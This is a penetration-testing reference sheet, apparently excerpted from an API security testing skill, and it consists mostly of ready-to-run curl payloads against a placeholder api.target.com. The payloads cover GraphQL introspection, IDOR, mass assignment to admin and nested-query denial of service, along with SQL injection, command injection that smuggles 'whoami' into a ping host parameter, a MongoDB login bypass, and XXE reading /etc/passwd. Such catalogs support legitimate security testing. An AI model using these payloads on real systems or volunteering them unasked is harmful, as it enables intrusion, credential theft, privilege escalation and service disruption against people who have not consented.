# GraphQL Testing and API Injection Attack Payloads

Deep reference catalogs extracted from the API Security Testing skill: GraphQL
discovery/introspection/exploitation queries, and the exhaustive API injection
payload catalog (SQL, command, NoSQL, XXE).

## Contents

- [GraphQL API Testing](#graphql-api-testing)
  - [GraphQL Discovery](#graphql-discovery)
  - [GraphQL Introspection](#graphql-introspection)
  - [GraphQL Queries](#graphql-queries)
  - [GraphQL Vulnerabilities](#graphql-vulnerabilities)
- [API Injection Attacks](#api-injection-attacks)
  - [SQL Injection](#sql-injection)
  - [Command Injection](#command-injection)
  - [NoSQL Injection](#nosql-injection)
  - [XXE in XML APIs](#xxe-in-xml-apis)

## GraphQL API Testing

**GraphQL Discovery:**
```bash
# Common GraphQL endpoints
/graphql
/graphql/console
/graphql/graphiql
/graphiql
/api/graphql
/v1/graphql

# Introspection query (check if enabled)
curl https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

**GraphQL Introspection:**
```graphql
# Full introspection query
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

# Query specific type
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
      }
    }
  }
}
```

**GraphQL Queries:**
```bash
# Basic query
curl https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id username email } }"}'

# Query with variables
curl https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query($id: Int!) { user(id: $id) { username email } }","variables":{"id":1}}'

# Mutation
curl https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateUser(id: 1, role: \"admin\") { id role } }"}'
```

**GraphQL Vulnerabilities:**
```bash
# Test for IDOR
{"query":"{ user(id: 2) { id email password } }"}

# Test for mass assignment
{"query":"mutation { updateUser(id: 1, role: \"admin\", isAdmin: true) }"}

# Batch queries (DoS potential)
{"query":"{ user1: user(id: 1) { id } user2: user(id: 2) { id } ... }"}

# Deep nested queries (DoS)
{"query":"{ user { posts { comments { user { posts { comments { ... } } } } } }"}

# Alias abuse
{"query":"{ a: users { id } b: users { id } c: users { id } ... }"}
```

## API Injection Attacks

**SQL Injection:**
```bash
# In query parameters
curl "https://api.target.com/users?id=1' OR '1'='1"
curl "https://api.target.com/users?id=1 UNION SELECT password FROM admin--"

# In JSON body
curl -X POST https://api.target.com/search \
  -H "Content-Type: application/json" \
  -d '{"query":"test\' OR \'1\'=\'1"}'
```

**Command Injection:**
```bash
# In parameters
curl "https://api.target.com/ping?host=8.8.8.8;whoami"
curl "https://api.target.com/ping?host=8.8.8.8|id"

# In JSON
curl -X POST https://api.target.com/diagnostic \
  -H "Content-Type: application/json" \
  -d '{"command":"ping;whoami"}'
```

**NoSQL Injection:**
```bash
# MongoDB injection
curl -X POST https://api.target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

curl -X POST https://api.target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":".*"}}'
```

**XXE in XML APIs:**
```bash
# If API accepts XML
curl -X POST https://api.target.com/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <user><name>&xxe;</name></user>'
```
